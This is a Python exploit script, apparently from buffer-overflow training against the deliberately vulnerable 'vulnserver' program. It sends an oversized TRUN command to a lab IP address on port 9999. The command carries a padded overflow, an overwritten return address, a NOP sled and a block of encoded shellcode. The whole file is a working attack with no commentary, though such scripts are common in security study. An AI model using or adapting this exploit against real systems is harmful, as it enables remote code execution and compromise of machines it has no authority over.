#!/bin/python

import socket,struct
chars = b"".join([ struct.pack('<B',x) for x in range(1,256)])
eip = struct.pack("<I",0x62501203)
nop_sled = b"\x90" * 16
buf =  b""
buf += b"\xda\xc8\xba\xe1\x87\xba\xba\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x59\x31\x56\x19\x03\x56\x19\x83\xc6\x04\x03"
buf += b"\x72\x46\x52\x4c\x7d\xb7\xa3\x32\x4f\x65\xc7\x39\xfd"
buf += b"\xb9\x81\xd8\x89\xe8\x9d\xa9\xdc\x18\xaf\x52\xef\x97"
buf += b"\x85\x8a\x7b\xa5\x31\xe3\xbb\xe6\x7e\x62\x40\xf5\x52"
buf += b"\x44\x79\x36\xa7\x85\xbe\x80\xcd\x6a\x12\x44\xa5\x26"
buf += b"\x83\xe1\xfb\xfa\xa2\x25\x70\x42\xdd\x40\x47\x36\x51"
buf += b"\x4a\x98\x3d\x31\x6c\x48\x40\x11\xe7\x20\x5a\x10\x31"
buf += b"\xc4\x66\x2b\x3d\x6c\x1d\x7f\x4a\x6e\xf7\xb1\x8c\xdd"
buf += b"\x36\x7e\x01\x1f\x7f\xb9\xfa\x6a\x8b\xb9\x87\x6c\x48"
buf += b"\xc3\x53\xf8\x4e\x63\x17\x5a\xaa\x95\xf4\x3d\x39\x99"
buf += b"\xb1\x4a\x65\xbe\x44\x9e\x1e\xba\xcd\x21\xf0\x4a\x95"
buf += b"\x05\xd4\x17\x4d\x27\x4d\xf2\x20\x58\x8d\x5a\x9c\xfc"
buf += b"\xc6\x49\xcb\x81\x27\x92\xf4\xdf\xbf\x5e\x39\xe0\x3f"
buf += b"\xc9\x4a\x93\x0d\x56\xe1\x3b\x3d\x1f\x2f\xbb\x34\x37"
buf += b"\xd0\x13\xfe\x58\x2e\x94\xfe\x71\xf5\xc0\xae\xe9\xdc"
buf += b"\x68\x25\xea\xe1\xbc\xd3\xe0\x75\xff\x8b\x32\x04\x97"
buf += b"\xc9\xbc\x16\x34\x44\x5a\x48\x94\x06\xf3\x29\x44\xe6"
buf += b"\xa3\xc1\x8e\xe9\x9c\xf2\xb0\x20\xb5\x99\x5e\x9c\xed"
buf += b"\x35\xc6\x85\x66\xa7\x07\x10\x03\xe7\x8c\x90\xf3\xa6"
buf += b"\x64\xd1\xe7\xdf\x12\x19\xf8\x1f\xb7\x19\x92\x1b\x11"
buf += b"\x4e\x0a\x26\x44\xb8\x95\xd9\xa3\xbb\xd2\x26\x32\x8d"
buf += b"\xa9\x11\xa0\xb1\xc5\x5d\x24\x31\x16\x08\x2e\x31\x7e"
buf += b"\xec\x0a\x62\x9b\xf3\x86\x17\x30\x66\x29\x41\xe4\x21"
buf += b"\x41\x6f\xd3\x06\xce\x90\x36\x15\x09\x6e\xc4\x32\xb2"
buf += b"\x06\x36\x03\x42\xd6\x5c\x83\x12\xbe\xab\xac\x9d\x0e"
buf += b"\x53\x67\xf6\x06\xde\xe6\xb4\xb7\xdf\x22\x18\x69\xdf"
buf += b"\xc1\x81\x9a\x9a\xaa\x36\x5b\x5b\xa3\x52\x5c\x5b\xcb"
buf += b"\x64\x61\x8d\xf2\x12\xa4\x0d\x41\x2c\x93\x30\xe0\xa7"
buf += b"\xdb\x67\xf2\xed"
s = socket.socket()
s.connect(("192.168.199.131",9999))
payload = "TRUN /.:/"+"A"*2003+eip+nop_sled+buf+"C"*(3000-2003-len(eip)-len(nop_sled)-len(buf))
s.send(payload)
